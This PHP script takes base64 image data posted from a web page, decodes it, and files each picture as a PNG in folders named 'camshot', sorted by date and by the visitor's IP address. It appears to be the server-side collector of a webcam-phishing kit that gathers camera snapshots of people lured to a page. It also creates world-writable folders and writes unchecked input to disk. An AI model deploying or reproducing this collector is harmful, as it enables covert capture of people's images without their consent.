<?php
include 'ip.php';
$date = date('dMYHis');
$date_f = date('d-M-Y');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}

$folderName = 'camshot/'.$date_f;
if(!is_dir($folderName))
{
    mkdir($folderName, 0777);
}
$ipaddress_f = 'camshot/'.$date_f.'/'.$ipaddress;
if(!is_dir($ipaddress_f))
{
    mkdir($ipaddress_f, 0777);
    
}



$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );
rename('cam'.$date.'.png', 'camshot/'.$date_f.'/cam'.$date.'.png');
rename('camshot/'.$date_f.'/cam'.$date.'.png', 'camshot/'.$date_f.'/'.$ipaddress.'/cam'.$date.'.png');

exit();
?>
